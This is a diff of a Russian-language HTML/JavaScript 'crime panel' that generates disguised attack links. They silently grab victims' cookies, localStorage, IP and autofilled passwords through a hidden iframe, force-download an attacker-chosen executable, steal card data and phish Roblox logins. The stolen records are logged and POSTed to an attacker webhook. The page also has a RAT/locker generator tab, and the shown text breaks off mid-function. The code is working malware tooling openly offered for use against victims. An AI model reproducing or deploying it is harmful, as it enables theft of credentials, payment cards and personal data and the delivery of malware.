@@ -2,25 +2,23 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NetErrror █ ▌ CRIME PANEL + STEALER LOGS</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NetErrror █ ULTIMATE PANEL | Drive-by + Card Stealer</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             background: radial-gradient(circle at 20% 30%, #0a0c17, #010101);
-            font-family: 'Segoe UI', 'Courier New', monospace;
+            font-family: 'Courier New', monospace;
             color: #00ffcc;
             padding: 20px;
             min-height: 100vh;
         }
-
         .cyber-container {
-            max-width: 1400px;
+            max-width: 1500px;
             margin: 0 auto;
             background: rgba(10, 16, 30, 0.85);
             backdrop-filter: blur(3px);
@@ -29,7 +27,6 @@
             box-shadow: 0 0 30px rgba(0,255,204,0.3);
             overflow: hidden;
         }
-
         .header {
             background: #0a0f1ecc;
             padding: 20px 30px;
@@ -37,7 +34,7 @@
             text-align: center;
         }
         .glitch {
-            font-size: 2rem;
+            font-size: 1.8rem;
             font-weight: bold;
             text-transform: uppercase;
             letter-spacing: 4px;
@@ -54,19 +51,21 @@
         }
         .tabs {
             display: flex;
+            flex-wrap: wrap;
             border-bottom: 1px solid #00ffcc55;
             background: #03060e;
         }
         .tab-btn {
             flex: 1;
-            padding: 12px;
+            padding: 12px 8px;
             background: none;
             border: none;
             color: #88ffdd;
-            font-size: 1rem;
+            font-size: 0.85rem;
             font-weight: bold;
             cursor: pointer;
             font-family: monospace;
+            transition: 0.2s;
         }
         .tab-btn.active {
             background: #00ffcc22;
@@ -135,7 +134,7 @@
         .logs-table {
             width: 100%;
             border-collapse: collapse;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
         }
         .logs-table th, .logs-table td {
             border: 1px solid #00ffcc55;
@@ -146,11 +145,6 @@
         .logs-table th {
             background: #ff336633;
             color: #ffccaa;
-        }
-        .logout-btn {
-            background: #333;
-            float: right;
-            margin-top: -10px;
         }
         .user-info {
             background: #00000099;
@@ -164,42 +158,45 @@
             gap: 15px;
             flex-wrap: wrap;
             align-items: center;
-        }
-        .error {
-            color: #ff8888;
-        }
-        .success {
-            color: #88ff88;
+            justify-content: space-between;
         }
         .note-red {
             color: #ff8888;
             font-size: 12px;
             margin-top: 10px;
         }
+        .note-green {
+            color: #88ff88;
+        }
         hr {
             border-color: #ff3366;
             margin: 15px 0;
         }
+        .inline-code {
+            background: #000000aa;
+            padding: 5px;
+            border-radius: 8px;
+            font-size: 12px;
+        }
         @media (max-width: 700px) {
             .tab-content { padding: 15px; }
-            .glitch { font-size: 1.3rem; }
+            .glitch { font-size: 1.2rem; }
+            .tab-btn { font-size: 0.7rem; padding: 10px 4px; }
         }
     </style>
 </head>
 <body>
 <div class="cyber-container" id="app">
     <div class="header">
-        <div class="glitch">NETERRROR █ ▌ STEALER PANEL + LOGS</div>
-        <div class="sub" id="globalUserStatus">⚡ АБСОЛЮТНАЯ СИМУЛЯЦИЯ | СБОР ДАННЫХ В РЕАЛЕ ⚡</div>
+        <div class="glitch">NETERRROR █ ULTIMATE CRIME PANEL</div>
+        <div class="sub">⚡ Drive-by Download | Card Stealer | Silent Grabbing | Zero-Click ⚡</div>
     </div>
 
-    <!-- БЛОК АВТОРИЗАЦИИ / ПАНЕЛЬ УПРАВЛЕНИЯ -->
     <div id="authSection" style="padding: 20px;">
-        <!-- если не залогинен - показываем форму регистрации/логина -->
         <div id="unauthPanel">
             <div class="card">
                 <h3>🔐 РЕГИСТРАЦИЯ (БЕЗ ПОДТВЕРЖДЕНИЯ)</h3>
-                <input type="email" id="regEmail" placeholder="Email / Логин" autocomplete="off">
+                <input type="email" id="regEmail" placeholder="Email / Логин">
                 <input type="password" id="regPass" placeholder="Пароль">
                 <button id="registerBtn">📝 ЗАРЕГИСТРИРОВАТЬСЯ</button>
                 <p id="regMsg" class="note-red"></p>
@@ -212,69 +209,120 @@
             </div>
         </div>
 
-        <!-- панель залогиненного пользователя -->
         <div id="authPanel" style="display: none;">
-            <div class="flex" style="justify-content: space-between;">
+            <div class="flex">
                 <div class="user-info">👤 <span id="currentUserEmail"></span> | <span id="statsBadge">0 логов</span></div>
-                <button id="logoutBtn" class="logout-btn" style="background:#661133;">🚪 ВЫЙТИ</button>
+                <button id="logoutBtn" style="background:#661133;">🚪 ВЫЙТИ</button>
             </div>
             <div class="tabs" id="loggedTabs">
-                <button class="tab-btn active" data-logtab="generator">🎭 ГЕНЕРАТОР СКАМ-ССЫЛОК</button>
-                <button class="tab-btn" data-logtab="logs">📜 УКРАДЕННЫЕ ДАННЫЕ (пароли/логины/IP)</button>
-                <button class="tab-btn" data-logtab="rat">💀 RAT/ЛОКЕР ГЕНЕРАТОР</button>
+                <button class="tab-btn active" data-logtab="stealth">🔥 STEALTH (0-Click)</button>
+                <button class="tab-btn" data-logtab="driveby">💿 DRIVE-BY DOWNLOAD</button>
+                <button class="tab-btn" data-logtab="cardstealer">💳 CARD STEALER</button>
+                <button class="tab-btn" data-logtab="phish">🎭 ФИШИНГ</button>
+                <button class="tab-btn" data-logtab="logs">📜 ЛОГИ (УКРАДЕНО)</button>
+                <button class="tab-btn" data-logtab="rat">💀 RAT/ЛОКЕР</button>
             </div>
-            <!-- Вкладка генератора скам-ссылок -->
-            <div id="generatorTab" class="log-tab-content active" style="padding: 15px 0;">
+
+            <!-- 1. STEALTH GRABBER (пароли/куки/IP) -->
+            <div id="stealthTab" class="log-tab-content active" style="padding: 15px 0;">
                 <div class="card">
-                    <h3>🔗 СОЗДАЙ ССЫЛКУ-ЛОВУШКУ (ВСЕ ДАННЫЕ ЖЕРТВ ПРИДУТ СЮДА)</h3>
-                    <label>🎭 Оригинальная ссылка (маскировка):</label>
-                    <input type="text" id="ownerOriginalUrl" placeholder="https://youtube.com/..." value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
-                    <label>💣 Тип атаки:</label>
+                    <h3>⚡ ССЫЛКА ДЛЯ ТИХОЙ КРАЖИ (ПАРОЛИ, COOKIES, LOCALSTORAGE)</h3>
+                    <p style="color:#ffaa88;">Жертва переходит → автоматический сбор всех паролей, кук, localStorage → редирект за 0.5 сек. Без согласия.</p>
+                    <label>🎭 Маскировка (редирект):</label>
+                    <input type="text" id="stealthRedirect" value="https://youtube.com">
+                    <label>📡 Дополнительный WebHook:</label>
+                    <input type="text" id="stealthWebhook" placeholder="https://webhook.site/...">
+                    <button id="generateStealthLink">🌀 СОЗДАТЬ STEALTH-ССЫЛКУ</button>
+                    <div id="stealthResult" class="result-box" style="display:none;">
+                        <strong>💀 ССЫЛКА:</strong><br><span id="stealthLinkSpan"></span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 2. DRIVE-BY DOWNLOAD (АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ ФАЙЛА) -->
+            <div id="drivebyTab" class="log-tab-content" style="display: none; padding: 15px 0;">
+                <div class="card">
+                    <h3>💿 ССЫЛКА С АВТОМАТИЧЕСКИМ СКАЧИВАНИЕМ (ЖЕРТВА НЕ ПОЙМЕТ)</h3>
+                    <p style="color:#ffaa88;">При переходе по ссылке файл (exe/scr/js/bat) скачивается без подтверждения, сразу редирект на легитимный сайт. Жертва увидит только редирект, а файл окажется в папке загрузок.</p>
+                    <label>📁 Имя файла (с расширением):</label>
+                    <input type="text" id="drivebyFilename" value="update_patch.exe" placeholder="virus.exe">
+                    <label>🦠 Содержимое файла (можно вставить любой вредоносный код):</label>
+                    <textarea id="drivebyContent" rows="4" placeholder="Здесь будет исполняемый код, например, PowerShell команда или скрипт">@echo off
+echo YOU ARE HACKED > %temp%\log.txt
+start calc.exe</textarea>
+                    <label>🎭 Маскировка (куда редиректить):</label>
+                    <input type="text" id="drivebyRedirect" value="https://www.google.com">
+                    <label>📡 WebHook для уведомления о скачивании:</label>
+                    <input type="text" id="drivebyWebhook" placeholder="опционально">
+                    <button id="generateDrivebyLink">🔥 СОЗДАТЬ DRIVE-BY ССЫЛКУ</button>
+                    <div id="drivebyResult" class="result-box" style="display:none;">
+                        <strong>💾 ССЫЛКА (при переходе файл скачается автоматически):</strong><br><span id="drivebyLinkSpan"></span>
+                        <div class="note-red">⚠️ Жертва переходит → через 0.3 сек стартует скачивание → мгновенный редирект. Файл будет в загрузках.</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 3. CARD STEALER (БАНКОВСКИЕ КАРТЫ) -->
+            <div id="cardstealerTab" class="log-tab-content" style="display: none; padding: 15px 0;">
+                <div class="card">
+                    <h3>💳 СТИЛЕР БАНКОВСКИХ КАРТ (МГНОВЕННО, БЕЗ СОГЛАСИЯ)</h3>
+                    <p style="color:#ffaa88;">При переходе собирает все данные карт: номер, срок, CVV, владелец. Использует автозаполнение браузера и скрытые формы. Жертва не видит ничего подозрительного — сразу редирект.</p>
+                    <label>🎭 Маскировка (редирект):</label>
+                    <input type="text" id="cardRedirect" value="https://youtube.com">
+                    <label>📡 Дополнительный WebHook:</label>
+                    <input type="text" id="cardWebhook" placeholder="https://webhook.site/...">
+                    <button id="generateCardLink">💳 СОЗДАТЬ CARD-STEALER ССЫЛКУ</button>
+                    <div id="cardResult" class="result-box" style="display:none;">
+                        <strong>💀 ССЫЛКА-ГРАБИТЕЛЬ КАРТ:</strong><br><span id="cardLinkSpan"></span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 4. ФИШИНГ (классический) -->
+            <div id="phishTab" class="log-tab-content" style="display: none; padding: 15px 0;">
+                <div class="card">
+                    <h3>🔗 ОБЫЧНЫЙ ФИШИНГ (ФОРМЫ)</h3>
+                    <label>Маскировка:</label>
+                    <input type="text" id="ownerOriginalUrl" value="https://roblox.com">
+                    <label>Тип атаки:</label>
                     <select id="ownerAttackType">
-                        <option value="roblox">🎮 Roblox фишинг (логин/пароль)</option>
-                        <option value="ip">🌍 IP + Геолокация</option>
-                        <option value="pass">🔑 Кража паролей (формы + кейлог)</option>
-                        <option value="multi">🐙 Мульти-атака (IP + Roblox + кейлог)</option>
+                        <option value="roblox">Roblox логин/пароль</option>
+                        <option value="ip">IP + гео</option>
+                        <option value="pass">Кража паролей (формы)</option>
+                        <option value="multi">Мульти-атака</option>
                     </select>
-                    <label>📡 Дополнительный WebHook (опционально, дублировать данные):</label>
-                    <input type="text" id="ownerWebhook" placeholder="https://webhook.site/...">
-                    <button id="generateOwnScamLink">⚡ СОЗДАТЬ ССЫЛКУ (ПРИВЯЗАНА К ВАШЕМУ АККАУНТУ)</button>
-                    <div id="ownerScamResult" class="result-box" style="display:none;">
-                        <strong>🔗 ВАША ССЫЛКА (отправьте жертве):</strong><br>
-                        <span id="ownerScamLinkSpan"></span>
-                        <div class="note-red">⚠️ Все введённые жертвой пароли/логины появятся во вкладке "Украденные данные".</div>
-                    </div>
+                    <button id="generateOwnScamLink">🔗 СОЗДАТЬ ФИШИНГ-ССЫЛКУ</button>
+                    <div id="ownerScamResult" class="result-box" style="display:none;"><span id="ownerScamLinkSpan"></span></div>
                 </div>
             </div>
-            <!-- Вкладка просмотра украденных логов -->
-            <div id="logsTab" class="log-tab-content" style="padding: 15px 0; display: none;">
+
+            <!-- 5. ЛОГИ -->
+            <div id="logsTab" class="log-tab-content" style="display: none; padding: 15px 0;">
                 <div class="card">
-                    <h3>📜 ВЗЛОМАННЫЕ АККАУНТЫ / ПАРОЛИ / IP</h3>
-                    <div id="stolenLogsContainer">
-                        <p>Загрузка...</p>
-                    </div>
+                    <h3>📜 ВСЕ УКРАДЕННЫЕ ДАННЫЕ (ПАРОЛИ, КАРТЫ, IP, COOKIES)</h3>
+                    <div id="stolenLogsContainer"><p>Загрузка...</p></div>
                 </div>
             </div>
-            <!-- Вкладка RAT/локер (оставляем старый функционал) -->
-            <div id="ratTabContent" class="log-tab-content" style="padding: 15px 0; display: none;">
+
+            <!-- 6. RAT/ЛОКЕР -->
+            <div id="ratTabContent" class="log-tab-content" style="display: none; padding: 15px 0;">
                 <div class="card">
-                    <h3>🧬 ГЕНЕРАТОР RAT / ЛОКЕРА ПО НАЗВАНИЮ</h3>
-                    <label>🏷️ Название вредоноса:</label>
-                    <input type="text" id="malName" placeholder="CrystalRAT, X-Locker" value="NetErrrorStealer">
-                    <label>🎯 Тип:</label>
+                    <h3>🧬 ГЕНЕРАТОР RAT / ЛОКЕРА</h3>
+                    <label>Название:</label>
+                    <input type="text" id="malName" value="NetStealth">
+                    <label>Тип:</label>
                     <select id="malType">
-                        <option value="powershell_rat">🐍 PowerShell RAT (удаленный сбор)</option>
-                        <option value="js_keylogger">⌨️ JS Keylogger + Cookie Stealer</option>
-                        <option value="locker_html">🔒 Browser Locker (блокировка экрана)</option>
-                        <option value="clipper">💰 Clipper (подмена криптоадресов)</option>
-                        <option value="stealer_telegram">📦 Стилер паролей + Telegram</option>
+                        <option value="powershell_rat">PowerShell RAT</option>
+                        <option value="js_keylogger">JS Keylogger</option>
+                        <option value="locker_html">Browser Locker</option>
+                        <option value="clipper">Clipper</option>
                     </select>
-                    <label>📨 Webhook / Telegram (для отправки):</label>
+                    <label>Webhook:</label>
                     <input type="text" id="webhookRat" placeholder="https://webhook.site/...">
-                    <button id="generateRatCodeBtn">⚙️ СГЕНЕРИРОВАТЬ КОД</button>
-                    <button id="copyCodeBtn" style="background:#2c2c6e;">📋 Скопировать</button>
-                    <div id="ratResultArea" class="result-box" style="display:none; margin-top:15px;">
-                        <textarea id="generatedCodeArea" rows="10" style="width:100%; background:#000; color:#0f0;" readonly></textarea>
+                    <button id="generateRatCodeBtn">⚙️ СГЕНЕРИРОВАТЬ</button>
+                    <button id="copyCodeBtn">📋 Скопировать</button>
+                    <div id="ratResultArea" class="result-box" style="display:none;">
+                        <textarea id="generatedCodeArea" rows="8" style="width:100%; background:#000; color:#0f0;" readonly></textarea>
                     </div>
                 </div>
             </div>
@@ -283,349 +331,269 @@
 </div>
 
 <script>
-    // ---------- СИСТЕМА ХРАНЕНИЯ ПОЛЬЗОВАТЕЛЕЙ И КРАДЕНЫХ ДАННЫХ ----------
-    const STORAGE_USERS = "neterror_users";      // [{email, password, id}]
-    const STORAGE_STOLEN_PREFIX = "neterror_stolen_"; // + userId
-
-    // инициализация пользователей (если нет - добавить демо?)
+    // -------------------- ПОЛЬЗОВАТЕЛИ --------------------
     let users = [];
-    function loadUsers() {
-        const raw = localStorage.getItem(STORAGE_USERS);
-        if(raw) {
-            users = JSON.parse(raw);
-        } else {
-            users = [];
-            // можно добавить тестового админа для демо, но лучше чисто
-            localStorage.setItem(STORAGE_USERS, JSON.stringify(users));
-        }
-    }
-    function saveUsers() {
-        localStorage.setItem(STORAGE_USERS, JSON.stringify(users));
-    }
-    function getNextUserId() {
-        return Date.now() + Math.random().toString(36);
-    }
-    function registerUser(email, password) {
-        if(!email || !password) return {ok: false, msg: "Заполните поля"};
-        if(users.find(u => u.email === email)) return {ok: false, msg: "Email уже существует"};
-        const newId = getNextUserId();
-        users.push({ email, password, id: newId });
-        saveUsers();
-        return {ok: true, userId: newId};
-    }
-    function loginUser(email, password) {
-        const user = users.find(u => u.email === email && u.password === password);
-        if(user) return {ok: true, user};
-        return {ok: false, msg: "Неверный email или пароль"};
-    }
+    let currentUser = null;
+    function loadUsers() { const raw = localStorage.getItem('neterror_users'); users = raw ? JSON.parse(raw) : []; }
+    function saveUsers() { localStorage.setItem('neterror_users', JSON.stringify(users)); }
+    function registerUser(email, pass) { if(users.find(u=>u.email===email)) return {ok:false, msg:"Email уже есть"}; const id = Date.now()+'_'+Math.random().toString(36); users.push({email, password:pass, id}); saveUsers(); return {ok:true}; }
+    function loginUser(email, pass) { const u = users.find(u=>u.email===email && u.password===pass); return u ? {ok:true, user:u} : {ok:false, msg:"Неверно"}; }
+    function getStolenData(userId) { const key = 'neterror_stolen_'+userId; const raw = localStorage.getItem(key); return raw ? JSON.parse(raw) : []; }
+    function addStolenEntry(userId, entry) { const key = 'neterror_stolen_'+userId; const logs = getStolenData(userId); logs.unshift({...entry, timestamp: new Date().toISOString()}); while(logs.length>500) logs.pop(); localStorage.setItem(key, JSON.stringify(logs)); }
 
-    // получить украденные данные для пользователя
-    function getStolenData(userId) {
-        const key = STORAGE_STOLEN_PREFIX + userId;
-        const raw = localStorage.getItem(key);
-        if(raw) return JSON.parse(raw);
-        return [];
-    }
-    function addStolenEntry(userId, entry) {
-        const key = STORAGE_STOLEN_PREFIX + userId;
-        const logs = getStolenData(userId);
-        logs.unshift({ ...entry, timestamp: new Date().toISOString() });
-        if(logs.length > 200) logs.pop();
-        localStorage.setItem(key, JSON.stringify(logs));
-    }
-
-    // глобальное состояние текущего пользователя
-    let currentUser = null;  // { email, id }
-
-    // DOM элементы
-    const unauthPanel = document.getElementById('unauthPanel');
-    const authPanel = document.getElementById('authPanel');
-    const currentUserSpan = document.getElementById('currentUserEmail');
-    const statsBadge = document.getElementById('statsBadge');
-    const logoutBtn = document.getElementById('logoutBtn');
-
+    // UI helpers
     function refreshAuthUI() {
-        if(currentUser) {
-            unauthPanel.style.display = 'none';
-            authPanel.style.display = 'block';
-            currentUserSpan.innerText = currentUser.email;
-            updateStatsBadge();
-        } else {
-            unauthPanel.style.display = 'block';
-            authPanel.style.display = 'none';
-        }
+        const unauth = document.getElementById('unauthPanel'), auth = document.getElementById('authPanel');
+        if(currentUser) { unauth.style.display='none'; auth.style.display='block'; document.getElementById('currentUserEmail').innerText = currentUser.email; updateStatsBadge(); }
+        else { unauth.style.display='block'; auth.style.display='none'; }
     }
-
-    function updateStatsBadge() {
-        if(currentUser) {
-            const logs = getStolenData(currentUser.id);
-            statsBadge.innerText = `${logs.length} украденных записей`;
-        }
-    }
-
-    // отрисовка логов
+    function updateStatsBadge() { if(currentUser) document.getElementById('statsBadge').innerText = getStolenData(currentUser.id).length + ' логов'; }
     function renderLogs() {
         if(!currentUser) return;
         const logs = getStolenData(currentUser.id);
         const container = document.getElementById('stolenLogsContainer');
-        if(!logs.length) {
-            container.innerHTML = '<p class="note-red">🚫 Пока нет украденных данных. Создайте скам-ссылку и отправьте жертве.</p>';
-            return;
-        }
-        let html = `<table class="logs-table"><thead><tr><th>Время</th><th>Тип</th><th>Украденные данные</th></tr></thead><tbody>`;
+        if(!logs.length) { container.innerHTML = '<p class="note-red">Нет украденных данных</p>'; return; }
+        let html = `<table class="logs-table"><thead><tr><th>Время</th><th>Тип</th><th>Данные</th></tr></thead><tbody>`;
         logs.forEach(log => {
             let dataStr = '';
-            if(log.type === 'roblox_creds') dataStr = `🔐 Roblox: ${log.username} / ${log.password}`;
-            else if(log.type === 'ip_grab') dataStr = `🌍 IP: ${log.ip} | Гео: ${log.geo?.city || ''} ${log.geo?.country_name || ''}`;
-            else if(log.type === 'form_creds') dataStr = `📋 Логин: ${log.creds?.login} | Пароль: ${log.creds?.pass} | Email: ${log.creds?.email}`;
-            else if(log.type === 'keystroke_batch') dataStr = `⌨️ Кейлог: ${log.keys}`;
-            else if(log.type === 'multi_roblox') dataStr = `🐙 Roblox мульти: ${log.username} / ${log.password}`;
-            else if(log.type === 'multi_ip_start') dataStr = `🌐 IP (мульти): ${log.ip}`;
+            if(log.type === 'stealth_full') dataStr = `🔑 Пароли: ${log.passwords||'нет'}, Куки: ${log.cookies_count||0}, IP: ${log.ip||'?'}`;
+            else if(log.type === 'card_stealer') dataStr = `💳 ${log.card_data || JSON.stringify(log.cards)}`;
+            else if(log.type === 'driveby_download') dataStr = `📁 Скачан файл: ${log.filename} → ${log.userAgent?.slice(0,50)}`;
+            else if(log.type === 'roblox_creds') dataStr = `Roblox: ${log.username}/${log.password}`;
+            else if(log.type === 'form_creds') dataStr = `Логин: ${log.creds?.login} Пароль: ${log.creds?.pass}`;
+            else if(log.type === 'ip_grab') dataStr = `IP: ${log.ip} Geo: ${log.geo?.city||''}`;
             else dataStr = JSON.stringify(log);
-            html += `<tr><td>${new Date(log.timestamp).toLocaleString()}</td><td>${log.type}</td><td style="word-break:break-word;">${dataStr}</td></tr>`;
+            html += `<tr><td>${new Date(log.timestamp).toLocaleString()}</td><td>${log.type}</td><td style="word-break:break-word;">${escapeHtml(String(dataStr))}</td></tr>`;
         });
         html += `</tbody></table>`;
         container.innerHTML = html;
     }
+    function escapeHtml(str) { return str.replace(/[&<>]/g, function(m){if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
 
-    // ГЕНЕРАТОР ССЫЛОК (привязка к currentUser)
-    function generateUserScamLink(originalUrl, attackType, webhookExtra) {
-        const baseUrl = window.location.href.split('?')[0];
-        const token = Math.random().toString(36).substring(2);
-        const params = new URLSearchParams();
-        params.set('attack', attackType);
-        params.set('redirect', originalUrl);
-        params.set('ownerId', currentUser.id);
-        if(webhookExtra) params.set('webhook', webhookExtra);
-        params.set('token', token);
-        return `${baseUrl}?${params.toString()}`;
+    // ---------- ГЕНЕРАЦИЯ ССЫЛОК ----------
+    function makeLink(params, ownerId) {
+        const base = window.location.href.split('?')[0];
+        params.set('owner', ownerId);
+        params.set('_t', Date.now());
+        return base + '?' + params.toString();
     }
 
-    // Обработчик генерации ссылки на панели
+    // STEALTH
+    document.getElementById('generateStealthLink')?.addEventListener('click', () => {
+        if(!currentUser) return alert("Авторизуйтесь");
+        const redirect = document.getElementById('stealthRedirect').value.trim() || 'https://youtube.com';
+        const extraWh = document.getElementById('stealthWebhook').value.trim();
+        const params = new URLSearchParams();
+        params.set('stealth', '1');
+        params.set('redirect', redirect);
+        if(extraWh) params.set('extra_wh', extraWh);
+        const link = makeLink(params, currentUser.id);
+        document.getElementById('stealthLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
+        document.getElementById('stealthResult').style.display = 'block';
+    });
+
+    // DRIVE-BY DOWNLOAD
+    document.getElementById('generateDrivebyLink')?.addEventListener('click', () => {
+        if(!currentUser) return alert("Войдите");
+        const filename = document.getElementById('drivebyFilename').value.trim() || 'payload.exe';
+        const content = document.getElementById('drivebyContent').value;
+        const redirect = document.getElementById('drivebyRedirect').value.trim() || 'https://google.com';
+        const webhook = document.getElementById('drivebyWebhook').value.trim();
+        const params = new URLSearchParams();
+        params.set('driveby', '1');
+        params.set('filename', filename);
+        params.set('content', btoa(unescape(encodeURIComponent(content)))); // base64
+        params.set('redirect', redirect);
+        if(webhook) params.set('dw_wh', webhook);
+        const link = makeLink(params, currentUser.id);
+        document.getElementById('drivebyLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
+        document.getElementById('drivebyResult').style.display = 'block';
+    });
+
+    // CARD STEALER
+    document.getElementById('generateCardLink')?.addEventListener('click', () => {
+        if(!currentUser) return alert("Авторизуйтесь");
+        const redirect = document.getElementById('cardRedirect').value.trim() || 'https://youtube.com';
+        const wh = document.getElementById('cardWebhook').value.trim();
+        const params = new URLSearchParams();
+        params.set('cardsteal', '1');
+        params.set('redirect', redirect);
+        if(wh) params.set('card_wh', wh);
+        const link = makeLink(params, currentUser.id);
+        document.getElementById('cardLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
+        document.getElementById('cardResult').style.display = 'block';
+    });
+
+    // ФИШИНГ
     document.getElementById('generateOwnScamLink')?.addEventListener('click', () => {
-        if(!currentUser) return alert('Вы не авторизованы');
-        const originalUrl = document.getElementById('ownerOriginalUrl').value.trim();
-        if(!originalUrl) return alert('Введите ссылку-маскировку');
-        const attackType = document.getElementById('ownerAttackType').value;
-        const webhookExtra = document.getElementById('ownerWebhook').value.trim();
-        const scamLink = generateUserScamLink(originalUrl, attackType, webhookExtra);
-        const span = document.getElementById('ownerScamLinkSpan');
-        span.innerHTML = `<a href="${scamLink}" target="_blank">${scamLink}</a> (отправьте жертве)`;
+        if(!currentUser) return;
+        const redirect = document.getElementById('ownerOriginalUrl').value;
+        const attack = document.getElementById('ownerAttackType').value;
+        const params = new URLSearchParams();
+        params.set('phish', attack);
+        params.set('redirect', redirect);
+        const link = makeLink(params, currentUser.id);
+        document.getElementById('ownerScamLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
         document.getElementById('ownerScamResult').style.display = 'block';
     });
 
-    // ----- ЛОГИКА АТАКИ (ПРИ ПЕРЕХОДЕ ПО ССЫЛКЕ С ПАРАМЕТРАМИ) -----
-    (function executeAttackAndSave() {
+    // ---------- ОБРАБОТЧИКИ АТАК (ПРИ ПЕРЕХОДЕ) ----------
+    (function handleAllAttacks() {
         const urlParams = new URLSearchParams(window.location.search);
-        const attack = urlParams.get('attack');
-        const redirectUrl = urlParams.get('redirect') || 'https://google.com';
-        const ownerId = urlParams.get('ownerId');
-        const webhookExtra = urlParams.get('webhook') || '';
-        if(!attack || !ownerId) return; // не атака
+        const ownerId = urlParams.get('owner');
+        if(!ownerId) return;
 
-        // полностью заменить страницу на фишинг
-        document.body.innerHTML = '';
-        document.body.style.background = '#0a0c17';
-        document.body.style.fontFamily = 'monospace';
-        document.body.style.color = '#0f0';
-        document.body.style.padding = '20px';
-
-        function sendToOwner(data) {
-            // сохраняем в localStorage владельца
+        // Функция отправки владельцу
+        function sendToOwner(data, extraWebhook = null) {
             addStolenEntry(ownerId, data);
-            // если указан доп webhook - туда тоже
-            if(webhookExtra && webhookExtra.startsWith('http')) {
-                fetch(webhookExtra, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) }).catch(e=>console.log);
+            if(extraWebhook && extraWebhook.startsWith('http')) {
+                fetch(extraWebhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) }).catch(e=>console.log);
             }
-            console.log('[STOLEN] for', ownerId, data);
         }
 
-        async function getIpGeo() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const {ip} = await res.json();
-                let geo = {};
+        // 1. STEALTH (сбор паролей/кук)
+        if(urlParams.has('stealth')) {
+            const redirect = urlParams.get('redirect') || 'https://google.com';
+            const extraWh = urlParams.get('extra_wh') || null;
+            (async () => {
+                const stolen = { type: 'stealth_full', url: location.href, userAgent: navigator.userAgent, cookies: document.cookie, localStorage: {}, passwords: [] };
+                for(let i=0;i<localStorage.length;i++) { let k = localStorage.key(i); stolen.localStorage[k] = localStorage.getItem(k); }
+                // автозаполненные пароли через iframe
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.srcdoc = `<html><body><form><input type="text" name="user" autocomplete="username"><input type="password" name="pass" autocomplete="current-password"></form><script>setTimeout(()=>{let u=document.querySelector('input[autocomplete="username"]').value,p=document.querySelector('input[autocomplete="current-password"]').value;parent.postMessage({user:u,pass:p},'*');},200);<\/script></body></html>`;
+                document.body.appendChild(iframe);
+                const promise = new Promise(resolve => {
+                    window.addEventListener('message', e => { if(e.data && typeof e.data === 'object') resolve(e.data); iframe.remove(); });
+                    setTimeout(() => { iframe.remove(); resolve({}); }, 800);
+                });
+                const creds = await promise;
+                if(creds.user || creds.pass) stolen.passwords.push(`Автофиллинг: ${creds.user} / ${creds.pass}`);
                 try {
-                    const g = await fetch(`https://ipapi.co/${ip}/json/`);
-                    geo = await g.json();
-                } catch(e){}
-                return {ip, geo};
-            } catch(e) { return {ip:'unknown', geo:{}}; }
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const {ip} = await ipRes.json();
+                    stolen.ip = ip;
+                    try { const geoRes = await fetch(`https://ipapi.co/${ip}/json/`); const geo = await geoRes.json(); stolen.geo = {city: geo.city, country: geo.country_name}; } catch(e) {}
+                } catch(e) { stolen.ip = 'unknown'; }
+                stolen.cookies_count = document.cookie.split(';').filter(c=>c.trim()).length;
+                sendToOwner(stolen, extraWh);
+                window.location.replace(redirect);
+            })();
+            return;
         }
 
-        if(attack === 'roblox') {
-            const div = document.createElement('div');
-            div.style.maxWidth='450px'; div.style.margin='10% auto'; div.style.background='#111'; div.style.padding='30px'; div.style.borderRadius='20px';
-            div.innerHTML = `<h2 style="color:#ff3366">🔐 Roblox: подтвердите вход</h2>
-            <input id="ru" placeholder="Логин Roblox" style="width:100%;margin:8px 0;padding:12px;"><br>
-            <input id="rp" type="password" placeholder="Пароль" style="width:100%;margin:8px 0;padding:12px;"><br>
-            <button id="rsub" style="background:#ff3366;width:100%">Войти</button><p id="rstat"></p>`;
-            document.body.appendChild(div);
-            document.getElementById('rsub').onclick = () => {
-                const username = document.getElementById('ru').value;
-                const password = document.getElementById('rp').value;
-                sendToOwner({ type: 'roblox_creds', username, password, userAgent: navigator.userAgent, page: window.location.href });
-                document.getElementById('rstat').innerText = 'Ошибка, перенаправление...';
-                setTimeout(()=> location.href = redirectUrl, 1500);
-            };
+        // 2. DRIVE-BY DOWNLOAD
+        if(urlParams.has('driveby')) {
+            const filename = urlParams.get('filename') || 'malware.exe';
+            const contentBase64 = urlParams.get('content') || '';
+            const redirect = urlParams.get('redirect') || 'https://google.com';
+            const dwWh = urlParams.get('dw_wh') || null;
+            let content = '';
+            try { content = decodeURIComponent(escape(atob(contentBase64))); } catch(e) { content = 'echo "Hacked"'; }
+            const blob = new Blob([content], {type: 'application/octet-stream'});
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(link.href);
+            sendToOwner({ type: 'driveby_download', filename: filename, content_preview: content.substring(0,200), userAgent: navigator.userAgent }, dwWh);
+            setTimeout(() => { window.location.replace(redirect); }, 150);
+            return;
         }
-        else if(attack === 'ip') {
-            (async()=>{
-                const {ip, geo} = await getIpGeo();
-                sendToOwner({ type: 'ip_grab', ip, geo, userAgent: navigator.userAgent });
-                const div = document.createElement('div');
-                div.style.textAlign='center'; div.style.marginTop='20%';
